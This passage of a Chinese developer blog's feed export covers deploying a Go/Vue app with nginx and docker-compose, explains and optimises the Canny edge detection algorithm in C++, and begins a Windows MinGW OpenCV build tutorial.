<p>然后把访问其他所有路径的请求都用都用打包好的前端处理。这里因为使用了vue-router，所以使用try_files把其他所有路径的请求也用index.html来处理。</p>
<p>也就是说把&#x2F; -&gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</p>
<p>也同样把&#x2F;xx&#x2F;xx&#x2F;* -&gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</p>
<p>这样就用户直接输入url的时候也能访问到对应的router-view中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">   listen 8000;</span><br><span class="line"></span><br><span class="line">   server_name _;</span><br><span class="line"></span><br><span class="line">   client_max_body_size 50M;</span><br><span class="line">   location /api &#123;</span><br><span class="line">      proxy_set_header Host $http_host;</span><br><span class="line">      proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">      proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">      proxy_pass http://177.7.0.11:8080;</span><br><span class="line">      rewrite &quot;^/api/(.*)$&quot; /api/$1 break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">      proxy_set_header Host $http_host;</span><br><span class="line">      proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">      proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">      proxy_pass http://177.7.0.11:8080;</span><br><span class="line">      rewrite &quot;^/static/(.*)$&quot; /static/$1 break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   location / &#123;</span><br><span class="line">      root /usr/share/nginx/html;</span><br><span class="line">      index index.html;</span><br><span class="line">      try_files $uri $uri/ /index.html last;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>完成了之后也可以尝试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd AynaAPI-Frontend</span><br><span class="line">// 构建镜像, backend 为镜像名字</span><br><span class="line">docker build -t frontend:v0.1 .</span><br><span class="line">// 运行</span><br><span class="line">docker run -it -p &quot;8000:8000&quot; --rm frontend:v0.1</span><br></pre></td></tr></table></figure>

<h1 id="0x4-docker-compose来整合前后端"><a href="#0x4-docker-compose来整合前后端" class="headerlink" title="0x4 docker-compose来整合前后端"></a>0x4 docker-compose来整合前后端</h1><p>项目结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- AynaAPI</span><br><span class="line">-- AynaAPI-Frontend</span><br><span class="line">-- docker-compose.yaml</span><br></pre></td></tr></table></figure>

<p>做完前后端的Dockerfile之后就可以把这两个整合到一起了，首先我们来回顾一下需要解决的问题</p>
<ul>
<li>后端依赖redis，需要一个redis容器，且要能访问这个redis容器(177.7.0.12)</li>
<li>前端依赖后端，需要一个能访问到后端的地址(177.7.0.11)</li>
</ul>
<p>那么我们就来写一下这个docker-compose.yaml吧。</p>
<p>可以看到我们首先定义了一个网络，命名为<strong>ayapi</strong>，且他的地址在177.7.0.0-177.7.0.255上。</p>
<p>然后我们有三个service，分别是frontend，backend，以及redis。</p>
<p>在每个services里，我们通过networks选项给每个容器分配了一个网络，以及对应的ip地址。比如backend就分配到了177.7.0.11，redis分配到了177.7.0.12。这就是为什么前面的ip地址要填这两个。</p>
<p>同时，frontend依赖backend，backend依赖redis，这样可以让容器按顺序(redis-backend-frontend)启动，以此来避免不必要的错误。</p>
<p>再来看看build，context指的是build的时候要传入的上下文，相当于<code>docker build -t xxx .</code>中的**.**。所以frontend就是.&#x2F;AynaAPI-Frontend，后端backend就是.&#x2F;AynaAPI</p>
<p>最后把frontend的8000通过ports暴露给外面，这样外面才可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  ayapi:</span><br><span class="line">    ipam:</span><br><span class="line">      driver: default</span><br><span class="line">      config:</span><br><span class="line">        - subnet: &#x27;177.7.0.0/16&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  frontend:</span><br><span class="line">    build:</span><br><span class="line">      context: ./AynaAPI-Frontend</span><br><span class="line">      dockerfile: ./Dockerfile</span><br><span class="line">    container_name: ayapi-frontend</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &#x27;8000:8000&#x27;</span><br><span class="line">    depends_on:</span><br><span class="line">      - backend</span><br><span class="line">    command: [ &#x27;nginx-debug&#x27;, &#x27;-g&#x27;, &#x27;daemon off;&#x27; ]</span><br><span class="line">    networks:</span><br><span class="line">      ayapi:</span><br><span class="line">        ipv4_address: 177.7.0.10</span><br><span class="line"></span><br><span class="line">  backend:</span><br><span class="line">    build:</span><br><span class="line">      context: ./AynaAPI</span><br><span class="line">      dockerfile: ./Dockerfile</span><br><span class="line">    container_name: ayapi-backend</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      - redis</span><br><span class="line">    networks:</span><br><span class="line">      ayapi:</span><br><span class="line">        ipv4_address: 177.7.0.11</span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    image: redis:alpine</span><br><span class="line">    container_name: ayapi-redis</span><br><span class="line">    restart: always</span><br><span class="line">    networks:</span><br><span class="line">      ayapi:</span><br><span class="line">        ipv4_address: 177.7.0.12</span><br></pre></td></tr></table></figure>

<p>完成<code>docker-compose.yaml</code>的编写后就可以尝试运行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 强制重写build</span><br><span class="line">docker-compose up --build</span><br><span class="line">// 直接运行</span><br><span class="line">docker-compose up</span><br><span class="line">// 后台运行</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img data-src="/images/coding/built-go-gin-backend-and-vue-spa-frontend-with-docker/2022-01-09_011048.jpg" alt="2022-01-09_011048.jpg"><br><img data-src="/images/coding/built-go-gin-backend-and-vue-spa-frontend-with-docker/2022-01-09_011219.jpg" alt="2022-01-09_011219.jpg"></p>
<h1 id="0x5-发布前端后端镜像，修改docker-compose"><a href="#0x5-发布前端后端镜像，修改docker-compose" class="headerlink" title="0x5 发布前端后端镜像，修改docker-compose"></a>0x5 发布前端后端镜像，修改docker-compose</h1><p>以上大概就是差不多基本完成了我的需求。但是有一个问题，就是如果要部署到服务器话，我们得把前端代码，后端的代码，以及docker-compose.yaml上传到服务器，然后用docker-compose运行。</p>
<p>或者写一个脚本，git clone两个代码然后运行docker-compose.</p>
<p>但是不管怎么样，这两种方法部署起来都比较麻烦，而且需要在服务器里进行构建，那么有没有别的方法呢？</p>
<p>当然有了，就是制作前端和后端的镜像，然后把制作好的镜像发布。</p>
<p>推送后端镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t aynakeya/aynaapi:v0.1 .</span><br><span class="line">docker push aynakeya/aynaapi:v0.1</span><br></pre></td></tr></table></figure>

<p>推送前端镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t aynakeya/aynaapi-fe:v0.1 .</span><br><span class="line">docker push aynakeya/aynaapi-fe:v0.1</span><br></pre></td></tr></table></figure>

<p>接着修改<code>docker-compose.yaml</code>，把build参数改为image，填上我们自己的镜像名字就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &quot;3&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  ayapi:</span><br><span class="line">    ipam:</span><br><span class="line">      driver: default</span><br><span class="line">      config:</span><br><span class="line">        - subnet: &#x27;177.7.0.0/16&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  frontend:</span><br><span class="line">    image: aynakeya/aynaapi-fe:v0.1</span><br><span class="line">    container_name: ayapi-frontend</span><br><span class="line">    restart: always</span><br><span class="line">    ports:</span><br><span class="line">      - &#x27;8000:8000&#x27;</span><br><span class="line">    depends_on:</span><br><span class="line">      - backend</span><br><span class="line">    command: [ &#x27;nginx-debug&#x27;, &#x27;-g&#x27;, &#x27;daemon off;&#x27; ]</span><br><span class="line">    networks:</span><br><span class="line">      ayapi:</span><br><span class="line">        ipv4_address: 177.7.0.10</span><br><span class="line"></span><br><span class="line">  backend:</span><br><span class="line">    image: aynakeya/aynaapi:v0.1</span><br><span class="line">    container_name: ayapi-backend</span><br><span class="line">    restart: always</span><br><span class="line">    depends_on:</span><br><span class="line">      - redis</span><br><span class="line">    networks:</span><br><span class="line">      ayapi:</span><br><span class="line">        ipv4_address: 177.7.0.11</span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    image: redis:alpine</span><br><span class="line">    container_name: ayapi-redis</span><br><span class="line">    restart: always</span><br><span class="line">    networks:</span><br><span class="line">      ayapi:</span><br><span class="line">        ipv4_address: 177.7.0.12</span><br></pre></td></tr></table></figure>

<p>这样子的话，如果需要在服务器上部署，只需要上传<code>docker-compose.yaml</code>，然后用<code>docker-compose up</code>就可以运行这整一个前后端分离项目了</p>
<h1 id="0x6-结尾"><a href="#0x6-结尾" class="headerlink" title="0x6 结尾"></a>0x6 结尾</h1><p>docker确实好用，虽然自己研究的时候踩了许多的坑，但是我这个时候应该写点什么来升华主题，但是我想不出写什么了，那就这样吧。摆了，啊对对对对对。</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>vue</tag>
        <tag>full stack</tag>
        <tag>go</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>Canny边缘检测算法的原理和实现</title>
    <url>/articles/coding/canny-algorithm-implementation/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文简单介绍了canny边缘识别算法的原理和c++实现</p>
<span id="more"></span>

<h1 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h1><p>Canny算法主要由四个步骤组成</p>
<ol>
<li><p>消除噪声</p>
</li>
<li><p>计算梯度和大小</p>
</li>
<li><p>利用梯度和大小去除非极大值</p>
</li>
<li><p>连接边缘</p>
</li>
</ol>
<h2 id="前置操作-图像灰度化"><a href="#前置操作-图像灰度化" class="headerlink" title="前置操作 - 图像灰度化"></a>前置操作 - 图像灰度化</h2><p>由于边缘检测只需要关心图像边缘，图像色彩不会造成影响。并且，储存灰度值只需要一个字节，这样子可以大大加速计算过程和节约内存空间。</p>
<p>所以在进行canny算法的实现之前，我们首先需要对图像进行灰度化操作。</p>
<p>常见的图像灰度化如下。</p>
<ol>
<li>取rgb通道中任意一个通道的值作为灰度值</li>
<li>取rgb通道中最大的一个通道的值作为灰度值</li>
<li>对rgb通道取平均值</li>
<li>用人眼对三原色的敏感度，对三个通道做加权平均得到灰度值</li>
</ol>
<p>在参考资料后，选择4作为灰度方法。</p>
<p>即</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> grey = <span class="number">0.114</span> * blue + <span class="number">0.587</span> * green + <span class="number">0.299</span> * red</span><br></pre></td></tr></table></figure>

<p>这个计算在整型的计算方法如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> B_coef = <span class="number">30</span>;   <span class="comment">// 0.114 * 256</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> G_coef = <span class="number">150</span>;  <span class="comment">// 0.587 * 256</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> R_coef = <span class="number">77</span>;   <span class="comment">// 0.299 * 256</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> grey = (<span class="type">uint8_t</span>) ((blue * B_coef + green * G_coef + red * R_coef) &gt;&gt; <span class="number">8</span>);</span><br></pre></td></tr></table></figure>



<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_102803.png" alt="asdf"></p>
<h2 id="高斯消除噪声-Gaussian-Filter"><a href="#高斯消除噪声-Gaussian-Filter" class="headerlink" title="高斯消除噪声 (Gaussian Filter)"></a>高斯消除噪声 (Gaussian Filter)</h2><p>在进行边缘检测之前，我们需要对图像进行平滑处理，以便减少图像中的噪声。噪声会导致边缘检测算法误检边缘，因此消除噪声是非常重要的一步。在Canny算法中，通常使用高斯模糊来平滑图像。</p>
<p>高斯模糊的原理是将每个像素的值与其周围像素的值进行加权平均，加权系数由高斯函数确定。具体公式如下：</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/2d_gaussian.png" alt="a"></p>
<blockquote>
<p>二维高斯函数</p>
</blockquote>
<p>通过二维高斯函数，我们就能够确定权重矩阵了。</p>
<p>计算方法：首先用高斯函数计算出每个点的值，然后做归一化处理，得到最后的权重矩阵。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Discrete-approximation-of-the-Gaussian-kernels-3x3-5x5-7x7.png" alt="asdf"></p>
<blockquote>
<p>权重矩阵近似值</p>
</blockquote>
<p>利用这个权重矩阵，对每个像素进行处理，就能得到高斯模糊后的图片了。</p>
<p>比如，一个像素点和他周围的值为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32 32 32</span><br><span class="line">32 32 32</span><br><span class="line">32 32 32</span><br></pre></td></tr></table></figure>

<p>在经过运算后，中间的像素值就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32 * 4 / 16 + 4 * 32 * 2 /16 + 4 * 32 * 1 / 16 = 32</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_102632.png"></p>
<h3 id="为什么需要先做高斯平滑"><a href="#为什么需要先做高斯平滑" class="headerlink" title="为什么需要先做高斯平滑"></a>为什么需要先做高斯平滑</h3><p>为什么消除噪声非常重要，如果我们不对图像做平滑处理，图像的信号就会如下所示。在这个时候直接计算derivative，会因为每个连续的点之间不够平滑，无法很好的得到一个first derivative signal，这就导致无法很好的通过first derivative判断边缘的位置</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20241003_174032.png" alt="a"></p>
<blockquote>
<p>credit: UBC CPSC427 @ Leonid Sigal </p>
</blockquote>
<p>在经过高斯后，我们可以发现信号就很平滑了，边缘的位置也比较好判断</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20241003_175339.png" alt="a"></p>
<blockquote>
<p>credit: UBC CPSC427 @ Leonid Sigal </p>
</blockquote>
<h2 id="计算梯度大小和方向-Gradient-Calculation"><a href="#计算梯度大小和方向-Gradient-Calculation" class="headerlink" title="计算梯度大小和方向 (Gradient Calculation)"></a>计算梯度大小和方向 (Gradient Calculation)</h2><p>边缘通常位于图像中灰度值变化较大的区域，因此我们需要计算图像中每个像素点的梯度。</p>
<p>由于2d图直接算比较复杂，且消耗运算量，我们可以分别计算图像在水平方向(x轴)和垂直方向(y轴)上的梯度。最后在通过公式计算出方向和大小。</p>
<p>梯度大小可以通过绝对值相加的方式计算（减少运算量）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">magnitude = <span class="built_in">abs</span>(dx) + <span class="built_in">abs</span>(dy)</span><br></pre></td></tr></table></figure>

<p>梯度方向可以通过<code>arctan</code>计算</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">direction = <span class="built_in">arctan</span>(dy/dx)</span><br></pre></td></tr></table></figure>

<h3 id="通过合并计算梯度与高斯平滑加速运算"><a href="#通过合并计算梯度与高斯平滑加速运算" class="headerlink" title="通过合并计算梯度与高斯平滑加速运算"></a>通过合并计算梯度与高斯平滑加速运算</h3><p>通过预先计算高斯平滑的导数，我们可以合并高斯平滑和导数计算。事先计算好高斯平滑的导数，在用这个函数与图像在傅立叶空间中相乘，直接得到高斯平滑后的导数。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20241003_181417.png" alt="a"></p>
<blockquote>
<p>credit: UBC CPSC427 @ Leonid Sigal </p>
</blockquote>
<h2 id="利用梯度大小和方向去除非极大值-Non-Maximum-Suppression"><a href="#利用梯度大小和方向去除非极大值-Non-Maximum-Suppression" class="headerlink" title="利用梯度大小和方向去除非极大值 (Non Maximum Suppression)"></a>利用梯度大小和方向去除非极大值 (Non Maximum Suppression)</h2><p>在计算出图像中每个像素点的梯度大小后，我们需要对其进行非极大值抑制。非极大值抑制的目的是去除那些不在边缘上的像素点，使得最终的边缘结果更加细致。</p>
<p>非极大值抑制的原理是：对每个像素点，根据其梯度方向，检查其在梯度方向上的两个邻近像素点的梯度大小。如果当前像素点的梯度大小不是最大的，则将其梯度值置为0。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/nms.jpg" alt="a"></p>
<blockquote>
<p>source: <a href="https://docs.opencv.org/3.4/da/d22/tutorial_py_canny.html">https://docs.opencv.org/3.4/da/d22/tutorial_py_canny.html</a></p>
</blockquote>
<p>在canny算法中，梯度方向被分为了0°,  45°, 90°, 135° 四个方向，即水平，垂直，两个斜45°方向。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/nms_direction.png" alt="nms_direction"></p>
<p>在具体实现中，我们可以使用<code>tan</code>函数先计算不同角度下<code>dy/dx</code>的值，然后通过<code>dy/dx</code>的比值来判断属于哪个方向。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> tan225 = <span class="number">27145</span>; <span class="comment">// 22.5° math.tan(math.pi/8) * (2**16)</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint32_t</span> tan675 = <span class="number">158217</span>; <span class="comment">// 67.5° math.tan(math.pi/8*3) * (2**16) </span></span><br><span class="line"><span class="type">uint32_t</span> tanxy;</span><br><span class="line"><span class="keyword">if</span> (gx != <span class="number">0</span>) &#123;</span><br><span class="line">    tanxy = (<span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(<span class="built_in">abs</span>(gy)) &lt;&lt; <span class="number">16</span>) / <span class="built_in">abs</span>(gx);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    tanxy = UINT32_MAX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tanxy &lt; tan225) &#123;</span><br><span class="line"><span class="comment">// 小于22.5° =&gt; 0°方向</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (tanxy &gt; tan675) &#123;</span><br><span class="line"><span class="comment">// 大于67.5° =&gt; 90°方向</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (gy*gx &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// dx,dy方向相同，45°方向</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// dx,dy方向相反，135°方向</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_104823.png" alt="asdf"></p>
<h2 id="双阈值检测-Double-Threshold"><a href="#双阈值检测-Double-Threshold" class="headerlink" title="双阈值检测 (Double Threshold)"></a>双阈值检测 (Double Threshold)</h2><p>双阈值检测的目的是将梯度值较大的边缘标记为强边缘，将梯度值较小但仍可能是边缘的像素标记为弱边缘。</p>
<p>通过设定两个阈值: 高阈值(k<sub>high</sub>), 和低阈值(k<sub>low</sub>)，我们可以将图像中的像素分类为强边缘 (A)、弱边缘(B, C) 和 非边缘。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/hysteresis.jpg" alt="a"></p>
<blockquote>
<p>source: <a href="https://docs.opencv.org/3.4/da/d22/tutorial_py_canny.html">https://docs.opencv.org/3.4/da/d22/tutorial_py_canny.html</a></p>
</blockquote>
<p>一般来说，高阀值设置为低阀值的两倍</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20241003_180728.png" alt="a"></p>
<blockquote>
<p>credit: UBC CPSC427 @ Leonid Sigal </p>
</blockquote>
<p>在具体实现中，把高于<code>maxVal</code>的像素点直接设置为255，把低于<code>minVal</code>的点直接设置为0，弱边缘的值保持不变。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (src.<span class="built_in">at</span>&lt;uchar&gt;(row, col) &lt; low_threshold) &#123;</span><br><span class="line">    dst.<span class="built_in">at</span>&lt;uchar&gt;(row, col) = <span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (src.<span class="built_in">at</span>&lt;uchar&gt;(row, col) &gt; high_threshold) &#123;</span><br><span class="line">    dst.<span class="built_in">at</span>&lt;uchar&gt;(row, col) = <span class="number">255</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    dst.<span class="built_in">at</span>&lt;uchar&gt;(row, col) = src.<span class="built_in">at</span>&lt;uchar&gt;(row, col);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_104716.png" alt="asd"></p>
<h2 id="连接边缘-hysteresis"><a href="#连接边缘-hysteresis" class="headerlink" title="连接边缘  (hysteresis)"></a>连接边缘  (hysteresis)</h2><p>在双阈值检测之后，我们需要将断开的弱边缘连接起来，使得边缘更加连贯。</p>
<p>其核心概念是把和强边缘(A)连接的弱边缘(C)也标记为边缘。</p>
<p>把没有和强边缘连接的弱边缘(B)标记为非边缘</p>
<p>解决方法思路可以通过对弱边缘进行dfs搜索，如果搜索到一个强边缘，则把路径上的的所有点标记为强边缘。否则把该点标记为非边缘。</p>
<p>再通过一个数组标记所有搜索过的点，那么每个像素最多就只会被遍历一遍。 </p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_104426.png" alt="asd"></p>
<h1 id="与OpenCV的实现进行比较"><a href="#与OpenCV的实现进行比较" class="headerlink" title="与OpenCV的实现进行比较"></a>与OpenCV的实现进行比较</h1><p>对于复杂图片，我的实现和opencv的实现在像素上的区别低于<code>0.5%</code></p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_091644.png" alt="a"></p>
<blockquote>
<p>复杂图片例子，区别0.31% mse&#x3D;0.00</p>
</blockquote>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_092645.png" alt="asdf"></p>
<blockquote>
<p>复杂图片例子 区别0.30% mse&#x3D;0.00</p>
</blockquote>
<p>对于简单图片，我的实现和opencv的实现在像素点上的区别低于<code>0.1%</code></p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_092107.png" alt="as"></p>
<blockquote>
<p>简单图片例子1   区别0.08% mse&#x3D;0.00</p>
</blockquote>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_092453.png" alt="as"></p>
<blockquote>
<p>简单图片例子2  区别0.01% mse&#x3D;0.00</p>
</blockquote>
<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>虽然在效果上相差已经不大了，但是和opencv在速度上差距很大，还需要对算法做进一步优化</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240620_155747.png" alt="a"></p>
<p>分割步骤后对三个步骤逐个进行分析并进行优化</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240621_115041.png" alt="a"></p>
<h2 id="缓存优化-cache-line-optimization"><a href="#缓存优化-cache-line-optimization" class="headerlink" title="缓存优化 (cache line optimization)"></a>缓存优化 (cache line optimization)</h2><p>缓存优化是通过减少缓存未命中次数、提高缓存命中率来提升程序性能的方法。</p>
<p>缓存未命中会导致处理器等待从主存中读取数据，从而降低程序执行速度。通过优化数据结构的排列方式，使数据访问更加连续，从而提高缓存命中率，加快算法执行。</p>
<p>例如，在边缘连接的dfs算法中，使用了在循环中使用了多个变量，并同时对这些变量进行了读取和储存。由于这些内存无法对其到同一条cache line上，会极大减少缓存命中率。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240621_142414.png" alt="asd"></p>
<p>优化方法为用宏替代<code>direction</code>，用<code>dst</code>数组本身替代<code>visited</code>记录是否访问过，以及别的方法，提高缓存命中率</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240621_142647.png"></p>
<h2 id="指针优化"><a href="#指针优化" class="headerlink" title="指针优化"></a>指针优化</h2><p>通过减少不必要的指针运算和索引操作，提高程序效率。</p>
<p>由于opencv里的<code>Mat::at</code>函数开销巨大，将使用<code>at</code>的地方替换成，直接使用指针进行数据访问，降低索引操作的开销。</p>
<p>同时，通过预先加载相邻像素值到局部变量，减少循环内的指针计算。</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240621_143300.png"></p>
<blockquote>
<p>优化前</p>
</blockquote>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240621_143151.png"></p>
<blockquote>
<p>优化后</p>
</blockquote>
<h2 id="优化结果"><a href="#优化结果" class="headerlink" title="优化结果"></a>优化结果</h2><p>优化后，速度提高了3倍</p>
<p><img data-src="/images/coding/canny-algorithm-implementation/Screenshot_20240621_141608.png"></p>
<p>要进行进一步优化加速，可能需要是使用多线程或者simd</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
<li><a href="https://docs.opencv.org/3.4/da/d22/tutorial_py_canny.html">OpenCV Canny Edge Detection</a></li>
<li><a href="https://en.wikipedia.org/wiki/Canny_edge_detector">Wikipedia: Canny Eddge Detector</a></li>
<li><a href="https://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html">阮一峰: 高斯模糊的算法</a></li>
<li><a href="https://blog.csdn.net/qq_29462849/article/details/81050212">Canny边缘检测算法解析</a></li>
<li><a href="https://xujinzh.github.io/2021/05/24/edge-detection-canny/index.html">Canny 图像边缘检测算法</a></li>
<li><a href="https://blog.csdn.net/leonardohaig/article/details/122141568">Canny边缘检测算法及实现</a></li>
<li><a href="https://plantegg.github.io/2021/05/16/CPU_Cache_Line%E5%92%8C%E6%80%A7%E8%83%BD/">CPU 性能和Cache Line</a></li>
<li><a href="https://xiaolincoding.com/os/1_hardware/how_cpu_deal_task.html">CPU 是如何执行任务的</a></li>
</ol>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>cv</tag>
        <tag>computer vision</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows上编译并使用opencv的正确姿势</title>
    <url>/articles/coding/compile-opencv-tutorial/</url>
    <content><![CDATA[<p>本文简单介绍了如何在windows上用mingw编译opencv！</p>
<p>并在cmake中使用自己编译好的opencv！</p>
<span id="more"></span>


<h1 id="编译OpenCV"><a href="#编译OpenCV" class="headerlink" title="编译OpenCV"></a>编译OpenCV</h1><h2 id="编译前的准备"><a href="#编译前的准备" class="headerlink" title="编译前的准备"></a>编译前的准备</h2><p>如果你想使用MSVC进行编译的话，你需要安装Visual Studio。由于本文中使用的编译器为mingw，这里暂时不介绍msvc。</p>
<h3 id="安装-mingw"><a href="#安装-mingw" class="headerlink" title="安装 mingw"></a>安装 mingw</h3><p>前往<a href="https://github.com/brechtsanders/winlibs_mingw/releases">https://github.com/brechtsanders/winlibs_mingw&#x2F;releases</a></p>
<p>下载完成后，解压mingw到一个文件夹下。</p>
<p>最后，把mingw的bin文件夹的路径添加的系统的PATH环境变量中即可</p>
<h3 id="安装-cmake"><a href="#安装-cmake" class="headerlink" title="安装 cmake"></a>安装 cmake</h3><p>前往<a href="https://cmake.org/download/">https://cmake.org/download/</a>，下载对应系统的安装包，然后安装即可。</p>
<h3 id="验证安装完成"><a href="#验证安装完成" class="headerlink" title="验证安装完成"></a>验证安装完成</h3><p>确认工具链都以及安装完成且已经在path里面惹</p>
<p><img data-src="/images/coding/compile-opencv-tutorial/Screenshot_20240613_143604.png" alt="ss"></p>
<h2 id="下载OpenCV源码以及OpenCV-Module源码"><a href="#下载OpenCV源码以及OpenCV-Module源码" class="headerlink" title="下载OpenCV源码以及OpenCV Module源码"></a>下载OpenCV源码以及OpenCV Module源码</h2><p>前往<a href="https://github.com/opencv/opencv/tags">https://github.com/opencv/opencv/tags</a> 下载指定版本的源码，或者直接clone</p>
<p>前往<a href="https://github.com/opencv/opencv_contrib/tags">https://github.com/opencv/opencv_contrib&#x2F;tags</a> 下载OpenCV module的源码，或者直接clone</p>
<p>下载完成后解压到一个位置，比如<code>D:/repo/opencv</code> 和 <code>D:/repo/opencv_contrib</code></p>
<h1 id="开始编译"><a href="#开始编译" class="headerlink" title="开始编译"></a>开始编译</h1><p>在开始中搜索 CMake (cmake-gui) 并启动</p>
<p>在 <code>Where is the source code</code> 中填入 <code>D:/repo/opencv/sources</code> (改成解压的位置)</p>
<p>在 <code>Where to build the binaries</code> 中填入  <code>D:/repo/opencv/build</code> (或者任意一个你想要的文件夹)</p>
<p><img data-src="/images/coding/compile-opencv-tutorial/Screenshot_20240613_145834.png" alt="a"></p>
<p>点击 <code>Configure</code> 按钮，在跳出的界面中选择 &quot;Mingw Makefiles&quot;</p>
<p><img data-src="/images/coding/compile-opencv-tutorial/Screenshot_20240613_145603.png" alt="a"></p>
<p>完成之后，点finish等待cmake configure完成。</p>
<p>在完成configure之后，需要修改一些选项，删除一些不要的module，添加一些需要的module，以及设置安装路径</p>
<p>在搜索中搜索选项的名字，并填上相对应的值</p>
<p><img data-src="/images/coding/compile-opencv-tutorial/Screenshot_20240613_150221.png" alt="a"></p>
<ul>
<li>BUILD_PROTOBUF – 取消勾选</li>
<li>WITH_PROTOBUF – 取消勾选</li>
<li>BUILD_TESTS – 取消勾选</li>
<li>WITH_OPENEXR – 取消勾选</li>
